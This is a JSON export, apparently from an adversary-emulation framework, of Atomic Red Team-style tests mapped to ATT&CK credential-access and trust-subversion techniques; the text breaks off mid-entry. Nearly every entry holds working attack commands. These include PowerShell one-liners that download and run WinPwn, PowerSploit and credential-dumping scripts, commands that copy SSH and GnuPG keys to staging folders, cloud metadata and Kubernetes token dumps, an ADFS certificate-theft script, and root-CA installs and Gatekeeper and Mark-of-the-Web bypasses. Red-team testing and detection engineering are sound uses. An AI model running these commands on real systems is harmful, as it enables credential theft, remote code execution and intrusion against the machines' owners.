"tags": []}, {"data": {"name": "Dump credentials from Windows Credential Manager With PowerShell [web Credentials]", "shortName": "T1555", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module will extract the credentials from Windows Credential Manager\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm60u02zk29mq7qrre2oc"], "tags": []}, {"data": {"name": "Remove the Zone.Identifier alternate data stream", "shortName": "T1553.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_download | File that will be downloaded to test against. | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md | \n | file_path | File to have the Zone.Identifier removed. | String | $env:tmp\\ReadMe.md | "}, "executionSteps": [{"description": "Unblock-File -Path #{file_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6c003b029mq68kv9119"], "tags": []}, {"data": {"name": "Mount ISO image", "shortName": "T1553.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path_of_iso | Path to ISO file | Path | PathToAtomicsFolder\\T1553.005\\bin\\T1553.005.iso | "}, "executionSteps": [{"description": "Mount-DiskImage -ImagePath \"#{path_of_iso}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6c003b029mq68kv9119"], "tags": []}, {"data": {"name": "Mount an ISO image and run executable from the ISO", "shortName": "T1553.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  \n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path_of_iso | Path to ISO file | Path | PathToAtomicsFolder\\T1553.005\\bin\\FeelTheBurn.iso | "}, "executionSteps": [{"description": "$keep = Mount-DiskImage -ImagePath \"#{path_of_iso}\" -StorageType ISO -Access ReadOnly\n$driveLetter = ($keep | Get-Volume).DriveLetter\ninvoke-item \"$($driveLetter):\\hello.exe\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6c003b029mq68kv9119"], "tags": []}, {"data": {"name": "Execute LNK file from ISO", "shortName": "T1553.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path_of_iso | Path to ISO file | Path | PathToAtomicsFolder\\T1553.005\\bin\\AllTheThings.iso | "}, "executionSteps": [{"description": "$keep = Mount-DiskImage -ImagePath \"#{path_of_iso}\" -StorageType ISO -Access ReadOnly\n$driveLetter = ($keep | Get-Volume).DriveLetter\n$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\"))\n$instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)\n", "successCriteria": null}], "techniqueIds": ["clacwm6c003b029mq68kv9119"], "tags": []}, {"data": {"name": "Install root CA on Windows with certutil", "shortName": "T1553.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a root CA with certutil\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | pfx_path | Path of the certificate | Path | $env:Temp\\rootCA2.cer | "}, "executionSteps": [{"description": "certutil -addstore my #{pfx_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6mf03mv29mqeulp18c9", "clacwm1z800h529mq4o92fh9o"], "tags": []}, {"data": {"name": "Install root CA on Windows", "shortName": "T1553.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a root CA with Powershell\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | pfx_path | Path of the certificate | Path | rootCA.cer | "}, "executionSteps": [{"description": "$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nMove-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6mf03mv29mqeulp18c9", "clacwm1z800h529mq4o92fh9o"], "tags": []}, {"data": {"name": "Install root CA on macOS", "shortName": "T1553.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a root CA with openssl\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | cert_filename | CA file name | Path | rootCA.crt | \n | key_filename | Key we create that is used to create the CA certificate | Path | rootCA.key | "}, "executionSteps": [{"description": "sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"#{cert_filename}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6mf03mv29mqeulp18c9", "clacwm1z800h529mq4o92fh9o"], "tags": []}, {"data": {"name": "Install root CA on Debian/Ubuntu", "shortName": "T1553.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a root CA with openssl\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | cert_filename | CA file name | Path | rootCA.crt | \n | key_filename | Key we create that is used to create the CA certificate | Path | rootCA.key | "}, "executionSteps": [{"description": "mv #{cert_filename} /usr/local/share/ca-certificates\necho sudo update-ca-certificates\n", "successCriteria": null}], "techniqueIds": ["clacwm6mf03mv29mqeulp18c9", "clacwm1z800h529mq4o92fh9o"], "tags": []}, {"data": {"name": "Install root CA on CentOS/RHEL", "shortName": "T1553.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a root CA with openssl\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | cert_filename | Path of the CA certificate we create | Path | rootCA.crt | \n | key_filename | Key we create that is used to create the CA certificate | Path | rootCA.key | "}, "executionSteps": [{"description": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\ncp #{cert_filename} /etc/pki/ca-trust/source/anchors/\nupdate-ca-trust\n", "successCriteria": null}], "techniqueIds": ["clacwm6mf03mv29mqeulp18c9", "clacwm1z800h529mq4o92fh9o"], "tags": []}, {"data": {"name": "Add Root Certificate to CurrentUser Certificate Store", "shortName": "T1553.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n", "successCriteria": null}], "techniqueIds": ["clacwm6mf03mv29mqeulp18c9"], "tags": []}, {"data": {"name": "Gatekeeper Bypass", "shortName": "T1553.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Gatekeeper Bypass via command line\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | app_path | Path to app to be used | Path | myapp.app | "}, "executionSteps": [{"description": "sudo xattr -d com.apple.quarantine #{app_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm5xt02wn29mq31gq13yc", "clacwm1wc00f629mq5kdgglhz"], "tags": []}, {"data": {"name": "ListSecrets", "shortName": "T1552.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services.\n\n\n**Supported Platforms:** containers\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | namespace | K8s namespace to list | String | default | "}, "executionSteps": [{"description": "kubectl get secrets -n #{namespace}\n", "successCriteria": null}], "techniqueIds": ["clacwm6uu03vx29mq8qp2apwi"], "tags": []}, {"data": {"name": "Cat the contents of a Kubernetes service account token file", "shortName": "T1552.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Access the Kubernetes service account access token stored within a container in a cluster.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token\n", "successCriteria": null}], "techniqueIds": ["clacwm6uu03vx29mq8qp2apwi"], "tags": []}, {"data": {"name": "GPP Passwords (Get-GPPPassword)", "shortName": "T1552.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | gpp_script_url | URL of the Get-GPPPassword PowerShell Script | Url | https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1 | \n | gpp_script_path | Path to the Get-GPPPassword PowerShell Script | Path | PathToAtomicsFolder\\T1552.006\\src\\Get-GPPPassword.ps1 | "}, "executionSteps": [{"description": ". #{gpp_script_path}\nGet-GPPPassword -Verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm6e603dd29mq5hc1flvv", "clacwm1x100fn29mq07txbrd8"], "tags": []}, {"data": {"name": "GPP Passwords (findstr)", "shortName": "T1552.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n", "successCriteria": null}], "techniqueIds": ["clacwm6e603dd29mq5hc1flvv", "clacwm1x100fn29mq07txbrd8"], "tags": []}, {"data": {"name": "Azure - Search Azure AD User Attributes for Passwords", "shortName": "T1552.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. \nUpon successful execution, this test will scan all user attributes for any strings containing \"password\".\nThose unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. \nSee: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md\n\n\n**Supported Platforms:** azure-ad\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Azure AD username | String | null | \n | password | Azure AD password | String | T1082Az | "}, "executionSteps": [{"description": "import-module msonline\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-MsolService -Credential $Credential\n$users = Get-MsolUser -All;\nforeach($user in $users)\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \nforeach($prop in $props)\n{if($user.$prop -like \"*password*\")\n{(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}\nget-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue\n", "successCriteria": null}], "techniqueIds": ["clacwm5sz02s229mq1wanclkc"], "tags": []}, {"data": {"name": "Azure - Dump Azure Instance Metadata from Virtual Machines", "shortName": "T1552.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test invokes a web request to the default Instance Metadata API of 169.254.169.254 in order to dump the data contained within it to a file. \nSee: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/\n\n\n**Supported Platforms:** iaas:azure\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | File to output metadata to | String | $env:temp\\T1552.005Test2.txt | "}, "executionSteps": [{"description": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 > #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5sz02s229mq1wanclkc"], "tags": []}, {"data": {"name": "Private Keys", "shortName": "T1552.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "dir c:\\ /b /s .key | findstr /e .key\n", "successCriteria": null}], "techniqueIds": ["clacwm669034o29mqenh6dkq2", "clacwm29o00oy29mqfwoig75g"], "tags": []}, {"data": {"name": "Discover Private SSH Keys", "shortName": "T1552.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Discover private SSH keys on a macOS or Linux system.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | search_path | Path where to start searching from. | Path | / | \n | output_file | Output file containing locations of SSH key files | Path | /tmp/keyfile_locations.txt | "}, "executionSteps": [{"description": "find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm669034o29mqenh6dkq2", "clacwm29o00oy29mqfwoig75g"], "tags": []}, {"data": {"name": "Copy the users GnuPG directory with rsync", "shortName": "T1552.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | search_path | Path where to start searching from | Path | / | \n | output_folder | Output folder containing a copy of the .gnupg directory | Path | /tmp/GnuPG | "}, "executionSteps": [{"description": "mkdir #{output_folder}\nfind #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \\;\n", "successCriteria": null}], "techniqueIds": ["clacwm669034o29mqenh6dkq2"], "tags": []}, {"data": {"name": "Copy Private SSH Keys with rsync", "shortName": "T1552.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | search_path | Path where to start searching from. | Path | / | \n | output_folder | Output folder containing copies of SSH private key files | Path | /tmp/art-staging | "}, "executionSteps": [{"description": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\;\n", "successCriteria": null}], "techniqueIds": ["clacwm669034o29mqenh6dkq2", "clacwm29o00oy29mqfwoig75g"], "tags": []}, {"data": {"name": "Copy Private SSH Keys with CP", "shortName": "T1552.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | search_path | Path where to start searching from. | Path | / | \n | output_folder | Output folder containing copies of SSH private key files | Path | /tmp/art-staging | "}, "executionSteps": [{"description": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \\;\n", "successCriteria": null}], "techniqueIds": ["clacwm669034o29mqenh6dkq2", "clacwm29o00oy29mqfwoig75g"], "tags": []}, {"data": {"name": "ADFS token signing and encryption certificates theft - Remote", "shortName": "T1552.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | adfs_service_account_name | Name of the ADFS service account | String | adfs_svc | \n | replication_user | Username with replication rights. It can be the Domain Admin running the script | String | Administrator | \n | replication_password | Password of replication_username | String | ReallyStrongPassword | \n | adfs_server_name | Name of an ADFS server | String | sts.contoso.com | "}, "executionSteps": [{"description": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n", "successCriteria": null}], "techniqueIds": ["clacwm669034o29mqenh6dkq2"], "tags": []}, {"data": {"name": "ADFS token signing and encryption certificates theft - Local", "shortName": "T1552.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Import-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n", "successCriteria": null}], "techniqueIds": ["clacwm669034o29mqenh6dkq2"], "tags": []}, {"data": {"name": "Search Through Bash History", "shortName": "T1552.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Search through bash history for specifice commands we want to capture\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | ~/loot.txt | \n | bash_history_grep_args | grep arguments that filter out specific commands we want to capture | Path | -e '-p ' -e 'pass' -e 'ssh' | \n | bash_history_filename | Path of the bash history file to capture | Path | ~/.bash_history | "}, "executionSteps": [{"description": "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6cp03br29mqgr76fmtk", "clacwm1e8003c29mq8zyg5i8l"], "tags": []}, {"data": {"name": "Enumeration for PuTTY Credentials in Registry", "shortName": "T1552.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry\nentries are found, they will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n", "successCriteria": null}], "techniqueIds": ["clacwm5yf02x429mqf1y038j0", "clacwm1ks007m29mqap87bpym"], "tags": []}, {"data": {"name": "Enumeration for Credentials in Registry", "shortName": "T1552.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word \"password\" will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n", "successCriteria": null}], "techniqueIds": ["clacwm5yf02x429mqf1y038j0", "clacwm1ks007m29mqap87bpym"], "tags": []}, {"data": {"name": "WinPwn - Snaffler", "shortName": "T1552.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSnaffler -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm6cz03c229mq075i02j3"], "tags": []}, {"data": {"name": "WinPwn - SessionGopher", "shortName": "T1552.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Launches SessionGopher on this system via WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsessionGopher -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm6cz03c229mq075i02j3"], "tags": []}, {"data": {"name": "WinPwn - sensitivefiles", "shortName": "T1552.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Search for sensitive files on this local system using the SensitiveFiles function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsensitivefiles -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm6cz03c229mq075i02j3"], "tags": []}, {"data": {"name": "WinPwn - powershellsensitive", "shortName": "T1552.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm6cz03c229mq075i02j3"], "tags": []}, {"data": {"name": "WinPwn - passhunt", "shortName": "T1552.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Search for Passwords on this system using passhunt via WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npasshunt -local $true -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm6cz03c229mq075i02j3"], "tags": []}, {"data": {"name": "WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials", "shortName": "T1552.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud -consoleoutput -noninteractive  ", "successCriteria": null}], "techniqueIds": ["clacwm6cz03c229mq075i02j3"], "tags": []}, {"data": {"name": "Find and Access Github Credentials", "shortName": "T1552.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done \n", "successCriteria": null}], "techniqueIds": ["clacwm6cz03c229mq075i02j3"], "tags": []}, {"data": {"name": "Extracting passwords with findstr", "shortName": "T1552.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -ErrorAction SilentlyContinue -Pattern password\n", "successCriteria": null}], "techniqueIds": ["clacwm6cz03c229mq075i02j3", "clacwm1k7007g29mqe4np2gk7"], "tags": []}, {"data": {"name": "Extract passwords with grep", "shortName": "T1552.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Extracting credentials from files\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_path | Path to search | String | / | "}, "executionSteps": [{"description": "grep -ri password #{file_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6cz03c229mq075i02j3", "clacwm1k7007g29mqe4np2gk7"], "tags": []}, {"data": {"name": "Extract Browser and System credentials with LaZagne", "shortName": "T1552.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "python2 laZagne.py all\n", "successCriteria": null}], "techniqueIds": ["clacwm6cz03c229mq075i02j3", "clacwm1k7007g29mqe4np2gk7"], "tags": []}, {"data": {"name": "Access unattend.xml", "shortName": "T1552.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n", "successCriteria": null}], "techniqueIds": ["clacwm6cz03c229mq075i02j3", "clacwm1k7007g29mqe4np2gk7"], "tags": []}, {"data": {"name": "AWS - Retrieve EC2 Password Data using stratus", "shortName": "T1552", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This atomic runs an API call GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances. This atomic 